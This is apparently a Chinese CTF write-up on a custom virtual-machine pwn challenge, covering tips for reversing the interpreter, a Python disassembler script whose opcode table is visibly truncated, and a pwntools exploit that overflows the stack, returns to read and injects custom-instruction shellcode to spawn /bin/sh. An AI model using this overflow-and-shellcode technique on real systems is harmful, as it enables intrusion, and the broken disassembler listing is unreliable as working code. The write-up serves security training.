# 逆向

vm（虚拟机），就是通过程序实现一个能检测字节码，并能执行对应指令的解释器。java的JVM也是一种vm。

ctf中，题目会编写一个简单的解释器，与一个对应的opcode（字节码形式），opcode使用自定义指令集，解释器中一般通过结构体实现自定义寄存器。

那么第一层障碍，就是逆向解释器，然后写脚本将字节码翻译成可读的自定义指令。

**解释器的逆向，有以下几个要点：**

1. 考虑一般汇编语言的形式，有大概两部分，一个是操作码（oprand），一个是其参数（可以为None），要分析，就要知道其长度，参数可为寄存器与立即数，要着重关注寄存器的调用方式（硬偏移，数组或结构体）与不同情况下立即数长度与大小端问题

2. 实现汇编，必须要大量调用实现cpu结构体，所以回复cpu结构体是第一要务，恢复完后逆向会容易很多

3. 大胆猜，开始一般会做栈与寄存器的初始化，结构对后面会很容易逆

```python
def arg0(data):
    count = int.from_bytes(data[:3], "big")
    return f"{count:x}h", data[3:]


def arg1(data):
    regnum = data[0]
    return f"r{regnum}", data[1:]


def arg2(data):
    regnum1 = data[0]
    regnum2 = data[1]
    return f"r{regnum1},r{regnum2}", data[2:]


def arg3(data):
    regnum1 = data[0]
    count = int.from_bytes(data[1:5], "little")
    return f"r{regnum1},{count:x}h", data[5:]


args_handle = [arg0, arg1, arg2, arg3]

    43: "jg",
    44: "jl",
    45: "jge",

    51: "syscall",

    55: "syscall",
    56: "syscall",
    57: "syscall",
    58: "syscall",

}


def main():

    f = open("vmcode", "rb")

    start = int.from_bytes(f.read(4), "little")
    rc = f.read()
    total = len(rc)
    jmplist = {}
    rel_code = {}

    while len(rc) != 0:
        addr = total - len(rc)
        oprand = rc[0]
        flag = oprand & 3
        oprand = oprand >> 2
        args, rc = args_handle[flag](rc[1:])
        inst_sign = sign[oprand]
        rel_code[addr] = (f"{inst_sign} {args}", None)
        if flag == 0 and 41 <= oprand <= 48:
            jmplist[addr] = (oprand, int(args[:-1], 16))

    labeln = 0
    funcn = 0
    lab = {}

    for i in jmplist:
        oprand, offset = jmplist[i]
        from_ = i + 4

        if (offset & 0x800000) != 0:
            to = from_ - (offset & 0x7FFFFF)
        else:
            to = from_ + offset

        if to not in lab:
            if oprand == 48:
                lab[to] = f"func_{funcn}"
                funcn += 1
            else:
                lab[to] = f"lab_{labeln}"
                labeln += 1
            rel_code[to] = (f"{rel_code[to][0]}", lab[to])

        rel_code[i] = (f"{sign[oprand]} {lab[to]}({to:x})", rel_code[i][1])

    rel_code[start] = (rel_code[start][0], "start")

    f = open("rel_code", "w")

    for i in rel_code:
        code, lab = rel_code[i]
        if lab != None:
            f.write(lab + ":" + "\n")
        f.write(f"\\x{i:x}: {code}\n")

    f.close()


main()
```

# 攻击思路

打vm的题，要避免一些惯性思维，要根据自定义cpu，栈结构与指令集进行攻击。

该题只有一个输入点，盲猜溢出，爆破返回地址偏移。类似32位架构控制返回read函数与栈上参数，读入shellcode后直接返回读入shellcode的地址（注意retn指令弹出栈的个数）

*ps：shell'code要用自定义指令集写....阴a...*

# exp

```python
from pwn import *
import sys

def exp(ip, port):
    p = remote(ip, port)
    shellcode = b"\x0f\x00/sh\x00\x0f\x01/bin}\x00}\x01\x8d\x00\x0f\x01\x00\x00\x00\x00\x0f\x02\x00\x00\x00\x00\xd0\x00\x00;"
    # gdb.attach(p,'b puts\nc')
    payload = p32(0x61616161) * 6 + p32(187) + p32(468) + p32(0) + p32(468) + p32(0x50)
    #返回read，写入shellcode，用read返回shellcode
    p.sendafter("name?", payload)
    pause()
    p.sendline(shellcode)
    p.interactive()


if __name__ == "__main__":
    exp(sys.argv[1], sys.argv[2])
```
